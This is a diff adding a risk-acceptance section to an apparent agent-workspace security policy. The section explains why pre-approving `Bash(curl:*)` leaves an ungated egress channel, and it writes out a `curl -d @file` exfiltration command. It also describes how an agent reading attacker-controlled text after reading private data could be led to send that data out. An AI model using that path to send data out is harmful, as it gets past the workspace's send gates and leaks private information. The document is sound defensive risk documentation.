@@ -226,6 +226,27 @@ test that fails without it. Do not describe it as guarded by anything more.
   progress watchdog that declares a hang only on real inactivity and verifies its
   postcondition, rather than trusting a wall-clock timeout or a bare exit code.
 
+### Accepted: `Bash(curl:*)` is pre-approved
+
+All three shipped permission templates
+(`.claude/settings.local.{linux,macos,windows}.json`) pre-approve `Bash(curl:*)`.
+This is the largest ungated egress channel in the workspace and it is a decision,
+not an oversight — reviewed and kept on 2026-08-23.
+
+What it means honestly: every outbound *send* is gated and every push is scanned,
+but `curl -d @file https://anywhere` passes through neither, with no approval
+click. An agent that has read private data and then reads attacker-controlled
+text has a path out.
+
+Why it stays: roughly half the workspace's integrations are curl calls, and
+scoping the grant to an allowlist of hosts turns routine work into a stream of
+approval prompts. The mitigations that do apply are the ones around it — the data
+overlay is a separate repository, secrets live only in a gitignored `.env`, and
+the agent tool-lists in `.claude/agents/` decide who gets a shell at all.
+
+Revisit this if the agent roster grows, or if any agent that reads untrusted
+external text is given `Bash`. (One already is; see the follow-up list.)
+
 ---
 
 ## 8. Your responsibilities
